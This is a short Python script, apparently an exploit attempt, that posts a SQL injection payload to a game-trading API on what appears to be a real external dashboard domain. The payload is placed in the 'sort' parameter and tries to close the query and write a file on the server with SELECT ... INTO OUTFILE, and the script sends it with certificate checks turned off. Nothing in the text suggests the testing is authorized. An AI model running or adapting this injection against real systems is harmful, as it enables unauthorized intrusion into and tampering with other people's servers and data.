#!/usr/bin/env python3
import requests, json

# Try multi-line comment to consume everything including ) tmp_count
payload = {
    'gameId': 1,
    'pageNum': 1,
    'pageSize': 10,
    'sort': ') AS t;SELECT "test" INTO OUTFILE "/tmp/test_write.txt";/*'
}

r = requests.post('https://dashboard.f1.hotgame.win/api/SysGameDataController/gameTradeData', json=payload, timeout=15, verify=False)
print('Status:', r.status_code)
print(r.text[:500])